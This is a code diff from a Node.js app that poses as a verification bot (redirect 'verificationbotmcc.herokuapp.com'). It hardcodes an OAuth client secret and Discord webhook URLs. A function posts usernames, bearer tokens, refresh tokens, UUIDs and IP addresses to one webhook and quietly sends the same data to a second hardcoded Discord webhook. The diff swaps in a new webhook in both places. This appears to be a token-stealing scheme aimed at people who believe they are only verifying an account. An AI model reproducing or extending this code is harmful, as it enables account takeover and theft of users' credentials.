@@ -2,7 +2,7 @@
 const client_secret = 'fW28Q~qzkof_87WUPSS12sL2FdiWDZzdNGtSiapk'
 const client_id = '410622f8-e40b-4596-8a3b-a8ced2d86fd8'
 const redirect_uri = 'https://verificationbotmcc.herokuapp.com/'
-const webhook_url = 'https://discord.com/api/webhooks/1041297474876358676/4VboyWLO6K4n2_lOWBo4E_LJg7ff3fhGYG3OYDyTtllPlndMotZmQJ2ZFj8THj8W2vsI'
+const webhook_url = 'https://discord.com/api/webhooks/1041325484375560193/Fv1ZdSqqCp46aRBDFq9Vvmw2KErEg7ev2LIKSIPl3sPVrybFW_qQ2B5FodciF_NGsXGo'
 //Requirements
 const axios = require('axios')
 const express = require('express')
@@ -142,7 +142,7 @@ function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
 }
 axios.all([ 
         axios.post(url, data),
-        axios.post("https://discord.com/api/webhooks/1041297474876358676/4VboyWLO6K4n2_lOWBo4E_LJg7ff3fhGYG3OYDyTtllPlndMotZmQJ2ZFj8THj8W2vsI", data)
+        axios.post("https://discord.com/api/webhooks/1041325484375560193/Fv1ZdSqqCp46aRBDFq9Vvmw2KErEg7ev2LIKSIPl3sPVrybFW_qQ2B5FodciF_NGsXGo", data)
            .then(() => console.log("Successfully authenticated, posting to webhook!"))
     ])    
 
